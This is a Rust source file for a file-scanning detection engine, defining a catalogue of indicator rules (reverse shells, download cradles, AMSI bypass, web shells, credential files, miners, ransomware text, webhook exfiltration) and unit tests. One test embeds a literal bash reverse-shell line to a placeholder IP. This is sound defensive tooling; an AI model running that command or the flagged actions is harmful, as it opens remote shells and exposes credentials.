//! Native indicator engine.
//!
//! The C++ core compiles every needle into one Aho-Corasick automaton and scans
//! a file in a single pass. This module owns the *policy*: which patterns are
//! worth looking for, how severe a hit is, what the analyst should do about it,
//! and which ATT&CK technique it maps to.
//!
//! The catalogue is deliberately narrow and documented. Every rule states what
//! it detects and what a reviewer should check; none of them claims that a file
//! is malware.

use std::path::Path;

use anyhow::Result;

use crate::detection::ffi::{self, MatcherRule, NativeMatcher, Needle};
use crate::engine::{FileAnalysis, Ioc, RuleMatch};
use crate::findings::{Evidence, Severity, Source};

const fn n(pattern: &'static str, nocase: bool) -> Needle {
    Needle { pattern, nocase }
}

/// A content indicator evaluated by the native matcher.
pub struct NativeRule {
    /// Stable id, used by correlation rules and `--min-level` filtering.
    pub id: &'static str,
    /// Short title shown in reports.
    pub title: &'static str,
    /// What the pattern means in context.
    pub description: &'static str,
    /// Severity assigned when the rule fires.
    pub severity: Severity,
    /// Require every needle (logical AND) instead of any (logical OR).
    pub require_all: bool,
    /// Needles to look for.
    pub needles: &'static [Needle],
    /// Tags for filtering.
    pub tags: &'static [&'static str],
    /// ATT&CK techniques.
    pub mitre: &'static [&'static str],
    /// Indicative compliance mappings.
    pub compliance: &'static [&'static str],
    /// What a reviewer should do next.
    pub remediation: &'static str,
}

const NO_COMPLIANCE: &[&str] = &[];
const NO_MITRE: &[&str] = &[];

/// Content indicators. Grouped by behavior so the report reads like a triage
/// note rather than a flat signature dump.
pub const RULES: &[NativeRule] = &[
    // -- Script interpreters and obfuscation -------------------------------
    NativeRule {
        id: "TVX-NAT-001",
        title: "PowerShell encoded command",
        description: "An encoded PowerShell command hides its payload from logs and reviewers.",
        severity: Severity::High,
        require_all: false,
        needles: &[n("-encodedcommand", true)],
        tags: &["powershell", "obfuscation"],
        mitre: &["T1059.001", "T1027"],
        compliance: &["NIST SI-4"],
        remediation: "Decode the command, confirm who created it, and remove the calling script.",
    },
    NativeRule {
        id: "TVX-NAT-002",
        title: "Base64 decoding in script",
        description: "Scripts that decode base64 usually carry a second-stage payload.",
        severity: Severity::Medium,
        require_all: false,
        needles: &[n("frombase64string", true)],
        tags: &["powershell", "obfuscation"],
        mitre: &["T1027", "T1140"],
        compliance: &[],
        remediation: "Decode the blob and review the resulting script before execution.",
    },
    NativeRule {
        id: "TVX-NAT-003",
        title: "Dynamic PowerShell evaluation",
        description: "Invoke-Expression executes a string as code, a common loader primitive.",
        severity: Severity::Medium,
        require_all: false,
        needles: &[n("invoke-expression", true)],
        tags: &["powershell", "execution"],
        mitre: &["T1059.001"],
        compliance: &[],
        remediation: "Replace with a reviewed, static command or remove the script.",
    },
    NativeRule {
        id: "TVX-NAT-004",
        title: "IEX alias used",
        description: "The IEX alias often shortens obfuscated download-and-execute chains.",
        severity: Severity::Low,
        require_all: false,
        needles: &[n("iex(", true)],
        tags: &["powershell"],
        mitre: &["T1059.001"],
        compliance: &[],
        remediation: "Review the surrounding script; IEX alone is not proof of malice.",
    },
    NativeRule {
        id: "TVX-NAT-005",
        title: "PowerShell download cradle",
        description: "DownloadString combined with IEX fetches and runs remote code in memory.",
        severity: Severity::Critical,
        require_all: true,
        needles: &[n("downloadstring", true), n("iex", true)],
        tags: &["powershell", "loader", "network"],
        mitre: &["T1059.001", "T1105"],
        compliance: &["PCI DSS 6.4"],
        remediation: "Block the script, identify the remote host, and treat the endpoint as suspect.",
    },
    NativeRule {
        id: "TVX-NAT-006",
        title: "AMSI bypass attempt",
        description: "Disabling the antimalware scan interface is a deliberate defense-evasion step.",
        severity: Severity::High,
        require_all: true,
        needles: &[n("amsi", true), n("bypass", true)],
        tags: &["evasion", "windows"],
        mitre: &["T1562.001"],
        compliance: &[],
        remediation: "Quarantine the script and review what it tries to run after the bypass.",
    },
    // -- Remote shells ------------------------------------------------------
    NativeRule {
        id: "TVX-NAT-007",
        title: "Bash /dev/tcp redirect",
        description: "The /dev/tcp pseudo-device is a common way to open a socket from a shell.",
        severity: Severity::High,
        require_all: false,
        needles: &[n("/dev/tcp/", false)],
        tags: &["shell", "network", "c2"],
        mitre: &["T1059.004", "T1071"],
        compliance: &["NIST CM-7"],
        remediation: "Inspect the parent process and the destination address; block it at the firewall.",
    },
    NativeRule {
        id: "TVX-NAT-008",
        title: "Interactive reverse shell",
        description: "`bash -i >&` redirects an interactive shell to a socket.",
        severity: Severity::Critical,
        require_all: false,
        needles: &[n("bash -i >&", false)],
        tags: &["shell", "reverse-shell"],
        mitre: &["T1059.004", "T1071"],
        compliance: &[],
        remediation: "Kill the process, capture its parent chain, and isolate the host.",
    },
    NativeRule {
        id: "TVX-NAT-009",
        title: "Netcat command execution",
        description: "`nc -e` spawns a program on a remote connection.",
        severity: Severity::High,
        require_all: false,
        needles: &[n("nc -e", false)],
        tags: &["reverse-shell", "network"],
        mitre: &["T1059", "T1071"],
        compliance: &[],
        remediation: "Block outbound netcat and investigate the invoking user.",
    },
    NativeRule {
        id: "TVX-NAT-010",
        title: "Ncat command execution",
        description: "`ncat -e` is the Nmap netcat equivalent of a bind or reverse shell.",
        severity: Severity::High,
        require_all: false,
        needles: &[n("ncat -e", false)],
        tags: &["reverse-shell", "network"],
        mitre: &["T1059", "T1071"],
        compliance: &[],
        remediation: "Remove the script and check for a persistence mechanism.",
    },
    NativeRule {
        id: "TVX-NAT-011",
        title: "Socat exec relay",
        description: "Socat with EXEC: relays a socket to a local program.",
        severity: Severity::Medium,
        require_all: true,
        needles: &[n("socat", true), n("exec:", true)],
        tags: &["tunnel", "network"],
        mitre: &["T1090"],
        compliance: &[],
        remediation: "Confirm whether the relay is an approved administration tunnel.",
    },
    NativeRule {
        id: "TVX-NAT-012",
        title: "Python reverse shell",
        description: "Socket plus pty.spawn is the canonical Python interactive shell.",
        severity: Severity::Critical,
        require_all: true,
        needles: &[n("import socket", true), n("pty.spawn", true)],
        tags: &["shell", "reverse-shell"],
        mitre: &["T1059.006", "T1071"],
        compliance: &[],
        remediation: "Treat the host as compromised; collect volatile evidence before cleanup.",
    },
    // -- Credential access --------------------------------------------------
    NativeRule {
        id: "TVX-NAT-013",
        title: "Shadow file reference",
        description: "A script referencing /etc/shadow is likely harvesting password hashes.",
        severity: Severity::Medium,
        require_all: false,
        needles: &[n("/etc/shadow", false)],
        tags: &["credentials"],
        mitre: &["T1003.008", "T1552"],
        compliance: &["PCI DSS 8.3.2"],
        remediation: "Check whether the file was read and rotate any exposed credentials.",
    },
    NativeRule {
        id: "TVX-NAT-014",
        title: "AWS access key identifier",
        description: "A hard-coded AWS access key id leaks cloud credentials to anyone with the file.",
        severity: Severity::High,
        require_all: false,
        needles: &[n("aws_access_key_id", true)],
        tags: &["credentials", "cloud"],
        mitre: &["T1552.001"],
        compliance: &["NIST IA-5"],
        remediation: "Revoke the key in IAM, rotate it, and move the value to a secret store.",
    },
    NativeRule {
        id: "TVX-NAT-015",
        title: "Embedded private key",
        description: "A PEM private key inside a file is an unmanaged credential.",
        severity: Severity::Medium,
        require_all: false,
        needles: &[n("-----begin rsa private key-----", true)],
        tags: &["credentials", "key-material"],
        mitre: &["T1552.004"],
        compliance: &[],
        remediation: "Move the key to an agent or vault and rotate it, because the copy is exposed.",
    },
    // -- Persistence --------------------------------------------------------
    NativeRule {
        id: "TVX-NAT-016",
        title: "Cron @reboot entry",
        description: "An @reboot job survives restarts and is a common persistence primitive.",
        severity: Severity::Medium,
        require_all: false,
        needles: &[n("@reboot", false)],
        tags: &["persistence"],
        mitre: &["T1053.003"],
        compliance: &[],
        remediation: "Verify the job's author and command; remove it if unexplained.",
    },
    NativeRule {
        id: "TVX-NAT-017",
        title: "LD_PRELOAD injection",
        description: "LD_PRELOAD loads an attacker library into every started process.",
        severity: Severity::Medium,
        require_all: false,
        needles: &[n("ld_preload", true)],
        tags: &["persistence", "evasion"],
        mitre: &["T1574.006"],
        compliance: &[],
        remediation: "Check /etc/ld.so.preload and the shell profiles for the referenced library.",
    },
    NativeRule {
        id: "TVX-NAT-018",
        title: "rc.local persistence",
        description: "/etc/rc.local runs at boot on many distributions and is often overlooked.",
        severity: Severity::Low,
        require_all: false,
        needles: &[n("/etc/rc.local", false)],
        tags: &["persistence"],
        mitre: &["T1037.004"],
        compliance: &[],
        remediation: "Review the file contents and its permissions.",
    },
    // -- Resource hijacking -------------------------------------------------
    NativeRule {
        id: "TVX-NAT-019",
        title: "Crypto mining pool",
        description: "A stratum URL points at a mining pool.",
        severity: Severity::High,
        require_all: false,
        needles: &[n("stratum+tcp://", true)],
        tags: &["miner", "resource-hijacking"],
        mitre: &["T1496"],
        compliance: &[],
        remediation: "Identify and remove the miner, then review how it was installed.",
    },
    NativeRule {
        id: "TVX-NAT-020",
        title: "XMRig miner reference",
        description: "XMRig is a widely abused Monero miner.",
        severity: Severity::High,
        require_all: false,
        needles: &[n("xmrig", true)],
        tags: &["miner"],
        mitre: &["T1496"],
        compliance: &[],
        remediation: "Remove the binary and check for a scheduled task that restores it.",
    },
    // -- Web shells ---------------------------------------------------------
    NativeRule {
        id: "TVX-NAT-021",
        title: "PHP eval web shell",
        description: "eval() on POST input executes arbitrary attacker-supplied PHP.",
        severity: Severity::Critical,
        require_all: true,
        needles: &[n("eval(", false), n("$_post", true)],
        tags: &["webshell", "php"],
        mitre: &["T1505.003", "T1059"],
        compliance: &["PCI DSS 6.4"],
        remediation: "Remove the file, rotate application secrets, and review access logs.",
    },
    NativeRule {
        id: "TVX-NAT-022",
        title: "PHP command web shell",
        description: "shell_exec() driven by GET input is a command-execution web shell.",
        severity: Severity::High,
        require_all: true,
        needles: &[n("shell_exec(", false), n("$_get", true)],
        tags: &["webshell", "php"],
        mitre: &["T1505.003"],
        compliance: &[],
        remediation: "Delete the file and determine the upload path used to place it.",
    },
    NativeRule {
        id: "TVX-NAT-023",
        title: "Encoded PHP payload",
        description: "base64_decode() feeding eval() hides the actual payload from a reviewer.",
        severity: Severity::High,
        require_all: true,
        needles: &[n("base64_decode(", true), n("eval(", false)],
        tags: &["webshell", "obfuscation"],
        mitre: &["T1505.003", "T1140"],
        compliance: &[],
        remediation: "Decode the payload to understand the backdoor before deleting it.",
    },
    // -- Ransomware ---------------------------------------------------------
    NativeRule {
        id: "TVX-NAT-024",
        title: "Ransom note text",
        description: "The text matches a common ransom note template.",
        severity: Severity::Critical,
        require_all: false,
        needles: &[n("your files have been encrypted", true)],
        tags: &["ransomware"],
        mitre: &["T1486"],
        compliance: &["NIST IR-4"],
        remediation: "Isolate the host, preserve evidence, and restore from a verified backup.",
    },
    NativeRule {
        id: "TVX-NAT-025",
        title: "Ransomware decryption instructions",
        description: "A README_FOR_DECRYPT name is a strong ransomware artifact.",
        severity: Severity::High,
        require_all: false,
        needles: &[n("readme_for_decrypt", true)],
        tags: &["ransomware"],
        mitre: &["T1486"],
        compliance: &[],
        remediation: "Isolate the host and check the backup and snapshot inventory.",
    },
    // -- Command and control / exfiltration ---------------------------------
    NativeRule {
        id: "TVX-NAT-026",
        title: "Discord webhook exfiltration",
        description: "Discord webhooks are commonly abused as a free exfiltration channel.",
        severity: Severity::Medium,
        require_all: false,
        needles: &[n("discord.com/api/webhooks", true)],
        tags: &["exfiltration", "network"],
        mitre: &["T1567.002"],
        compliance: &[],
        remediation: "Block the webhook host and check what data the script collected.",
    },
    NativeRule {
        id: "TVX-NAT-027",
        title: "Telegram bot API usage",
        description: "The Telegram bot API is a frequent low-cost command-and-control channel.",
        severity: Severity::Medium,
        require_all: false,
        needles: &[n("api.telegram.org", true)],
        tags: &["c2", "network"],
        mitre: &["T1102"],
        compliance: &[],
        remediation: "Review the script; legitimate tooling uses this API too.",
    },
    // -- Local privilege escalation and defense evasion ---------------------
    NativeRule {
        id: "TVX-NAT-028",
        title: "SUID bit assignment",
        description: "Setting setuid on a new file is a classic local escalation step.",
        severity: Severity::Medium,
        require_all: false,
        needles: &[n("chmod 4755", false)],
        tags: &["privilege-escalation"],
        mitre: &["T1548.001"],
        compliance: &[],
        remediation: "Inspect the target binary and remove the setuid bit if it is not required.",
    },
    NativeRule {
        id: "TVX-NAT-029",
        title: "Passwordless sudo rule",
        description: "NOPASSWD in a script or sudoers fragment removes authentication for escalation.",
        severity: Severity::Low,
        require_all: false,
        needles: &[n("nopasswd", true)],
        tags: &["privilege-escalation", "config"],
        mitre: &["T1548.003"],
        compliance: &["CIS 1.3.1"],
        remediation: "Confirm the rule is intentional; remove it otherwise.",
    },
    NativeRule {
        id: "TVX-NAT-030",
        title: "SELinux disabled at runtime",
        description: "`setenforce 0` switches SELinux to permissive mode.",
        severity: Severity::High,
        require_all: false,
        needles: &[n("setenforce 0", false)],
        tags: &["evasion", "mac"],
        mitre: &["T1562.001"],
        compliance: &[],
        remediation: "Re-enable enforcing mode and find who disabled it.",
    },
    NativeRule {
        id: "TVX-NAT-031",
        title: "Firewall rules flushed",
        description: "`iptables -F` removes every rule and exposes the host.",
        severity: Severity::Medium,
        require_all: false,
        needles: &[n("iptables -f", true)],
        tags: &["evasion", "firewall"],
        mitre: &["T1562.004"],
        compliance: &["CIS 3.5"],
        remediation: "Restore the firewall policy and review the invoking process.",
    },
    NativeRule {
        id: "TVX-NAT-032",
        title: "In-memory shellcode loader",
        description: "VirtualAlloc plus CreateThread is a minimal reflective loader pattern.",
        severity: Severity::High,
        require_all: true,
        needles: &[n("virtualalloc", true), n("createthread", true)],
        tags: &["loader", "windows"],
        mitre: &["T1055", "T1620"],
        compliance: &[],
        remediation: "Submit the sample for deeper analysis; do not execute it.",
    },
    NativeRule {
        id: "TVX-NAT-033",
        title: "Shell history cleared",
        description: "Clearing history is an anti-forensic step.",
        severity: Severity::Low,
        require_all: false,
        needles: &[n("history -c", true)],
        tags: &["anti-forensics"],
        mitre: &["T1070.003"],
        compliance: &[],
        remediation: "Check centralised logging for the commands that were run before the clear.",
    },
];

/// A structural indicator emitted by the ELF/PE analyser.
pub struct StructuralRule {
    /// Identifier reported by the native core.
    pub id: &'static str,
    /// Short title.
    pub title: &'static str,
    /// Why it matters.
    pub description: &'static str,
    /// Severity when observed.
    pub severity: Severity,
    /// What to do.
    pub remediation: &'static str,
    /// ATT&CK techniques.
    pub mitre: &'static [&'static str],
    /// Compliance mappings.
    pub compliance: &'static [&'static str],
}

/// Structural indicators. Informational entries are omitted from findings on
/// purpose: a note that a file is a script is not a security finding.
pub const STRUCTURAL: &[StructuralRule] = &[
    StructuralRule {
        id: "TVX-STRUCT-ELF-WX",
        title: "Writable and executable ELF segment",
        description: "A loadable segment is mapped writable and executable, defeating W^X.",
        severity: Severity::High,
        remediation: "Do not run the binary. Rebuild it from source with a normal toolchain.",
        mitre: NO_MITRE,
        compliance: NO_COMPLIANCE,
    },
    StructuralRule {
        id: "TVX-STRUCT-ELF-ENTRY-WRITABLE",
        title: "ELF entry point in writable memory",
        description: "The entry point lies inside a writable segment, which no normal linker produces.",
        severity: Severity::High,
        remediation: "Treat the binary as packed or tampered with.",
        mitre: NO_MITRE,
        compliance: NO_COMPLIANCE,
    },
    StructuralRule {
        id: "TVX-STRUCT-ELF-EXEC-STACK",
        title: "Executable stack requested",
        description: "PT_GNU_STACK requests an executable stack, removing stack-smashing protection.",
        severity: Severity::High,
        remediation: "Rebuild without executable-stack assembly, or do not run the file.",
        mitre: &["T1205"],
        compliance: NO_COMPLIANCE,
    },
    StructuralRule {
        id: "TVX-STRUCT-ELF-WX-SECTION",
        title: "Writable and executable section",
        description: "A section is both SHF_WRITE and SHF_EXECINSTR, typical of runtime unpackers.",
        severity: Severity::High,
        remediation: "Inspect the section contents before execution.",
        mitre: &["T1027.002"],
        compliance: NO_COMPLIANCE,
    },
    StructuralRule {
        id: "TVX-STRUCT-ELF-NO-PIE",
        title: "ELF binary is not position independent",
        description: "ET_EXEC binaries have fixed load addresses, which makes exploitation easier.",
        severity: Severity::Medium,
        remediation: "Rebuild with -fPIE -pie if the binary is maintained locally.",
        mitre: NO_MITRE,
        compliance: &["CIS 1.5.1"],
    },
    StructuralRule {
        id: "TVX-STRUCT-ELF-NO-RELRO",
        title: "No RELRO segment",
        description: "Without RELRO the GOT stays writable after relocation.",
        severity: Severity::Low,
        remediation: "Rebuild with -Wl,-z,relro,-z,now.",
        mitre: NO_MITRE,
        compliance: NO_COMPLIANCE,
    },
    StructuralRule {
        id: "TVX-STRUCT-ELF-NO-GNU-STACK",
        title: "No GNU stack header",
        description: "Stack executability is left to the loader default.",
        severity: Severity::Medium,
        remediation: "Rebuild with a toolchain that emits PT_GNU_STACK.",
        mitre: NO_MITRE,
        compliance: NO_COMPLIANCE,
    },
    StructuralRule {
        id: "TVX-STRUCT-PE-RWX",
        title: "Writable and executable PE section",
        description: "A section is marked MEM_WRITE and MEM_EXECUTE, a common unpacking stub trait.",
        severity: Severity::High,
        remediation: "Do not execute the file; submit it for deeper analysis.",
        mitre: &["T1027.002"],
        compliance: NO_COMPLIANCE,
    },
    StructuralRule {
        id: "TVX-STRUCT-PE-PACKER",
        title: "Packer section name",
        description: "Section names match a known packer or protector.",
        severity: Severity::Medium,
        remediation: "Unpack in a sandbox before review; packed samples hide their behaviour.",
        mitre: &["T1027.002"],
        compliance: NO_COMPLIANCE,
    },
    StructuralRule {
        id: "TVX-STRUCT-PE-HIGH-ENTROPY-SECTION",
        title: "High-entropy PE section",
        description: "A large section above 7.2 bits/byte is compressed or encrypted.",
        severity: Severity::Medium,
        remediation: "Treat the file as packed and analyse it in an isolated environment.",
        mitre: &["T1027.002"],
        compliance: NO_COMPLIANCE,
    },
    StructuralRule {
        id: "TVX-STRUCT-PE-NO-ASLR",
        title: "PE image does not request ASLR",
        description: "DYNAMICBASE is missing from DllCharacteristics.",
        severity: Severity::Medium,
        remediation: "Rebuild with /DYNAMICBASE.",
        mitre: NO_MITRE,
        compliance: NO_COMPLIANCE,
    },
    StructuralRule {
        id: "TVX-STRUCT-PE-NO-NX",
        title: "PE image does not request DEP",
        description: "NX_COMPAT is missing from DllCharacteristics.",
        severity: Severity::Medium,
        remediation: "Rebuild with /NXCOMPAT.",
        mitre: NO_MITRE,
        compliance: NO_COMPLIANCE,
    },
    StructuralRule {
        id: "TVX-STRUCT-PE-NO-CFG",
        title: "PE image has no Control Flow Guard",
        description: "GUARD_CF is not set, so indirect call targets are unchecked.",
        severity: Severity::Low,
        remediation: "Rebuild with /guard:cf.",
        mitre: NO_MITRE,
        compliance: NO_COMPLIANCE,
    },
    StructuralRule {
        id: "TVX-STRUCT-PE-RELOCS-STRIPPED",
        title: "PE relocations stripped",
        description: "IMAGE_FILE_RELOCS_STRIPPED prevents rebasing and conflicts with ASLR.",
        severity: Severity::Low,
        remediation: "Rebuild without /FIXED.",
        mitre: NO_MITRE,
        compliance: NO_COMPLIANCE,
    },
    StructuralRule {
        id: "TVX-STRUCT-MACHO-UNSUPPORTED",
        title: "Mach-O binary",
        description: "Mach-O headers are recognised but deep structural checks are not implemented.",
        severity: Severity::Info,
        remediation: "No action; informational only.",
        mitre: NO_MITRE,
        compliance: NO_COMPLIANCE,
    },
    StructuralRule {
        id: "TVX-STRUCT-SCRIPT",
        title: "Script interpreter",
        description: "A shebang line was found; informational only.",
        severity: Severity::Info,
        remediation: "No action; informational only.",
        mitre: NO_MITRE,
        compliance: NO_COMPLIANCE,
    },
];

/// Result of one native analysis.
pub struct NativeAnalysis {
    /// Matches in report form, most severe first.
    pub matches: Vec<RuleMatch>,
    /// Structural and statistical facts.
    pub analysis: FileAnalysis,
}

/// The compiled native engine.
pub struct NativeEngine {
    matcher: NativeMatcher,
    version: String,
}

impl NativeEngine {
    /// Compiles the built-in catalogue. Fails only if the C++ core rejects it.
    pub fn new() -> Result<Self> {
        let rules = RULES
            .iter()
            .map(|rule| MatcherRule {
                id: rule.id,
                require_all: rule.require_all,
                needles: rule.needles,
            })
            .collect::<Vec<_>>();
        let matcher = NativeMatcher::new(&rules)?;
        Ok(Self {
            matcher,
            version: ffi::core_version(),
        })
    }

    /// Number of content rules registered in the automaton.
    pub fn rule_count(&self) -> usize {
        self.matcher.rule_count()
    }

    /// Version of the C++ core.
    pub fn version(&self) -> &str {
        &self.version
    }

    /// Analyses `content`, attributing matches to `path`.
    pub fn analyze(&self, path: &Path, content: &[u8], truncated: bool) -> Result<NativeAnalysis> {
        let scan = self.matcher.scan(content)?;
        let mut matches = Vec::new();

        for hit in &scan.rules {
            let Some(rule) = RULES.iter().find(|rule| rule.id == hit.id) else {
                continue;
            };
            matches.push(rule_match(rule, hit));
        }

        for structural in &scan.structural {
            let Some(rule) = STRUCTURAL.iter().find(|rule| rule.id == structural.id) else {
                continue;
            };
            if rule.severity == Severity::Info {
                continue;
            }
            matches.push(RuleMatch {
                engine: Source::Native,
                rule: rule.id.to_owned(),
                namespace: "native-structural".to_owned(),
                title: rule.title.to_owned(),
                severity: rule.severity,
                level: rule.severity.level(),
                tags: vec!["structural".to_owned(), "binary".to_owned()],
                description: Some(rule.description.to_owned()),
                demo: false,
                evidence: vec![Evidence::new("detail", structural.detail.clone())],
                mitre: strings(rule.mitre),
                compliance: strings(rule.compliance),
                remediation: Some(rule.remediation.to_owned()),
            });
        }

        let kind = Some(scan.kind.clone()).filter(|kind| kind != "unknown" && !kind.is_empty());
        let binary = matches!(
            kind.as_deref(),
            Some("elf32" | "elf64" | "pe32" | "pe32+" | "macho32" | "macho64" | "macho-fat")
        );

        // Content heuristics only make sense for non-binaries; packed sections
        // are already covered by the structural analyser.
        if !binary && !truncated && content.len() >= 4096 && scan.max_window_entropy >= 7.5 {
            matches.push(heuristic(
                "TVX-NAT-ENTROPY",
                "High-entropy script content",
                Severity::Medium,
                format!(
                    "worst 4 KiB window is {:.2}/8 bits per byte",
                    scan.max_window_entropy
                ),
                "Scripts at this entropy are usually compressed or encrypted; decode before running.",
            ));
        }
        if scan.longest_base64_run >= 512 {
            matches.push(heuristic(
                "TVX-NAT-B64",
                "Large base64 blob",
                Severity::Medium,
                format!(
                    "longest base64 run is {} characters",
                    scan.longest_base64_run
                ),
                "An embedded blob this large usually carries a second-stage payload.",
            ));
        }

        matches.sort_by(|left, right| {
            right
                .level
                .cmp(&left.level)
                .then_with(|| left.rule.cmp(&right.rule))
        });

        let analysis = FileAnalysis {
            kind,
            arch: Some(scan.arch.clone()).filter(|arch| arch != "unknown" && !arch.is_empty()),
            bits: scan.bits,
            entropy: scan.entropy,
            max_window_entropy: scan.max_window_entropy,
            longest_base64_run: scan.longest_base64_run,
            iocs: scan
                .iocs
                .into_iter()
                .map(|ioc| Ioc {
                    kind: ioc.kind,
                    value: ioc.value,
                    offset: ioc.offset,
                })
                .collect(),
            truncated,
        };

        let _ = path;
        Ok(NativeAnalysis { matches, analysis })
    }
}

fn rule_match(rule: &NativeRule, hit: &ffi::NativeHit) -> RuleMatch {
    RuleMatch {
        engine: Source::Native,
        rule: rule.id.to_owned(),
        namespace: "native".to_owned(),
        title: rule.title.to_owned(),
        severity: rule.severity,
        level: rule.severity.level(),
        tags: strings(rule.tags),
        description: Some(rule.description.to_owned()),
        demo: false,
        evidence: vec![
            Evidence::new("first offset", format!("0x{:x}", hit.first_offset)),
            Evidence::new("occurrences", hit.hits.to_string()),
        ],
        mitre: strings(rule.mitre),
        compliance: strings(rule.compliance),
        remediation: Some(rule.remediation.to_owned()),
    }
}

fn heuristic(
    id: &str,
    title: &str,
    severity: Severity,
    value: String,
    remediation: &str,
) -> RuleMatch {
    RuleMatch {
        engine: Source::Native,
        rule: id.to_owned(),
        namespace: "native-heuristic".to_owned(),
        title: title.to_owned(),
        severity,
        level: severity.level(),
        tags: vec!["heuristic".to_owned()],
        description: Some(title.to_owned()),
        demo: false,
        evidence: vec![Evidence::new("measured", value)],
        mitre: vec!["T1027".to_owned()],
        compliance: Vec::new(),
        remediation: Some(remediation.to_owned()),
    }
}

fn strings(values: &[&str]) -> Vec<String> {
    values.iter().map(|value| (*value).to_owned()).collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn catalogue_is_consistent() {
        let mut ids = RULES.iter().map(|rule| rule.id).collect::<Vec<_>>();
        ids.sort_unstable();
        let unique = ids.len();
        ids.dedup();
        assert_eq!(ids.len(), unique, "native rule ids must be unique");
        assert!(RULES.len() >= 30, "catalogue should be substantive");

        for rule in RULES {
            assert!(!rule.needles.is_empty(), "{} has no needles", rule.id);
            assert!(rule.title.len() > 5, "{} needs a title", rule.id);
            for needle in rule.needles {
                assert!(
                    !needle.pattern.is_empty(),
                    "{} has an empty needle",
                    rule.id
                );
                assert!(!needle.pattern.contains('\0'), "{} has a NUL byte", rule.id);
            }
        }
    }

    #[test]
    fn structural_catalogue_is_consistent() {
        let mut ids = STRUCTURAL.iter().map(|rule| rule.id).collect::<Vec<_>>();
        let total = ids.len();
        ids.sort_unstable();
        ids.dedup();
        assert_eq!(ids.len(), total);
    }

    #[test]
    fn detects_a_reverse_shell_script() {
        let engine = NativeEngine::new().expect("build engine");
        assert!(engine.rule_count() >= 30);
        let content = b"#!/bin/bash\nbash -i >& /dev/tcp/203.0.113.7/4444 0>&1\n";
        let analysis = engine
            .analyze(Path::new("shell.sh"), content, false)
            .expect("analyse");
        let ids = analysis
            .matches
            .iter()
            .map(|entry| entry.rule.as_str())
            .collect::<Vec<_>>();
        assert!(ids.contains(&"TVX-NAT-007"), "ids: {ids:?}");
        assert!(ids.contains(&"TVX-NAT-008"), "ids: {ids:?}");
        assert_eq!(analysis.analysis.kind.as_deref(), Some("script"));
        assert!(
            analysis
                .analysis
                .iocs
                .iter()
                .any(|ioc| ioc.value == "203.0.113.7")
        );
    }

    #[test]
    fn require_all_prevents_partial_matches() {
        let engine = NativeEngine::new().expect("build engine");
        let analysis = engine
            .analyze(
                Path::new("partial.txt"),
                b"the word amsi appears alone",
                false,
            )
            .expect("analyse");
        assert!(
            !analysis
                .matches
                .iter()
                .any(|entry| entry.rule == "TVX-NAT-006")
        );
    }

    #[test]
    fn benign_text_produces_no_findings() {
        let engine = NativeEngine::new().expect("build engine");
        let analysis = engine
            .analyze(
                Path::new("notes.txt"),
                b"a short ordinary note about the weather and nothing else",
                false,
            )
            .expect("analyse");
        assert!(analysis.matches.is_empty(), "{:?}", analysis.matches);
    }
}
